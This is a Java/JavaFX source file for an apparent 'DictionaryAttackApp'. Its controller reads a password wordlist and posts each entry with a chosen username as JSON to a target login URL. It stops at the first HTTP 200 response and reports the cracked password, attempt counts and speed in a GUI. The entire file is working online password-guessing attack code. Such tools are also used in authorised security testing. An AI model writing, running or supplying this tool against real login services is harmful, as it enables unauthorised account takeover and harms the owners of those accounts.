package controller;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.stage.Stage;
import main.DictionaryAttackApp;

public class AttackController extends Application{
    private boolean passFound = false;
    private long sec = 0;
    private double obt = 1;
    @Override 
    public void start(Stage args0){
        DictionaryAttackApp dic = new DictionaryAttackApp();
        dic.dashboard(AttackController.this);
    }

    //start the engine
    public void start(String path, String username, String url, DictionaryAttackApp dic, long start, boolean term){
        Task<Void> attackTask = new Task<Void>() {
            @Override 
            protected Void call(){
                runAttack(path, username, url, dic, start, term);
                return null;
            }
        };
        Thread attackThread = new Thread(attackTask);
        attackThread.setDaemon(true);
        attackThread.start();
    }
    //Core logic / Engine
    private void runAttack(String path, String username, String url, DictionaryAttackApp dic, long start, boolean term){
        int size = getPasswords(path);

        try(BufferedReader reader = new BufferedReader(new FileReader(path))){
            String pass = null;
        //Creating HTTP client
        HttpClient client = HttpClient.newHttpClient();

        while((pass = reader.readLine()) != null && !(term)){
            term = dic.getTerm();
            String jsonPayload = ("{\"username\": \""+username+"\", \"password\": \""+pass+"\"}");
            //Visualizing elapsed time
            long end = System.currentTimeMillis();
            long elapsedTime = end - start;
            long mins = elapsedTime / 60000;
            sec = (elapsedTime % 60000)/1000;
            long ms = elapsedTime % 1000;
            double percentage = Math.round(((obt/size)*100.0) * 100.0) / 100.0;
            obt++;
            //building post request
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
                    .build();
            
            //catch a response
            int responseCode = 0;
            try{
                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                responseCode = response.statusCode();
                if (responseCode == 200) {
                    passFound = true;
                    break;
                }

            }
            catch(IOException | InterruptedException e){
                System.out.println("Network Error");
            }
            if(obt % 50 == 0){
                dic.appendLogArea("Status Code = "+ responseCode +"\nPayLoad = "+ jsonPayload+"\n");
                double resultNumbers = obt;
                String resultString = ""+obt;
                if(resultNumbers >= 1000000.0){
                    resultNumbers /= 1000000.0;
                    resultNumbers = Math.round(resultNumbers * 10.0) / 10.0;
                    resultString = resultNumbers + "M";
                }else if(resultNumbers >= 1000.0){
                    resultNumbers /= 1000.0;
                    resultNumbers = Math.round(resultNumbers * 10.0) / 10.0;
                    resultString = resultNumbers + "K";
                }

                dic.updateAttackUI(resultString, ""+mins+":"+sec+":"+ms, pass, percentage, resultString);
            }
            if(obt % 1000 == 0){
                dic.setLogArea("");
            }
        }
        if(passFound){
            dic.setpassField("Pass: "+pass);
            dic.appendLogArea("\nPassword found = "+ pass +"\n");
        }else{
            dic.setpassField("Password not found!");
            dic.appendLogArea("Password not found!\n");
        }
    }
    catch(Exception e){
        System.out.println("File Error!");
        e.printStackTrace();
    }
        double attemptMS = sec > 0 ? obt / sec : 0;
        attemptMS = Math.round(attemptMS * 1000.0) / 1000.0;
        dic.setc3Val(attemptMS+"");
    }
    // Counting passwords
    public int getPasswords(String path){
        int count = 0;
        try(BufferedReader reader = new BufferedReader(new FileReader(path))){
            while ((reader.readLine()) != null) { 
                count++;
            }
        }
        catch(Exception e){
            System.out.println("File not Found!");
        }
        return count;
    }
}
